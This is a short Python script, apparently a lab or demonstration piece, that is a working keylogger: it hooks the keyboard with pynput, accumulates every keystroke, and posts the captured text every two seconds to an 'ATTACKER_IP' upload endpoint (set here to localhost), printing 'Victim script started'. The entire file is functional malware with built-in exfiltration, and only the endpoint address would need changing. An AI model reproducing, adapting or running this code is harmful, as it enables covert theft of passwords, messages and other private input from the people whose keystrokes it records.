from pynput import keyboard
import requests 
import threading

ATTACKER_IP = "http://127.0.0.1:5000/upload" 
SEND_INTERVAL = 2

captured_keys = ""

def send_data():
    global captured_keys
    if len(captured_keys) > 0:
        try:
            payload = {'keys': captured_keys}
            requests.post(ATTACKER_IP, data=payload)
            captured_keys = "" 
        except Exception as e:
            print(f"[!] Error sending data: {e}")
            
    threading.Timer(SEND_INTERVAL, send_data).start()

def on_press(key):
    global captured_keys
    try:
        captured_keys += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            captured_keys += " "
        elif key == keyboard.Key.enter:
            captured_keys += " [ENTER] "
        else:
            captured_keys += f" [{str(key)}] "

print(f"[*] Victim script started...")
print(f"[*] Sending keystrokes to {ATTACKER_IP} every {SEND_INTERVAL} seconds.")

send_data()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
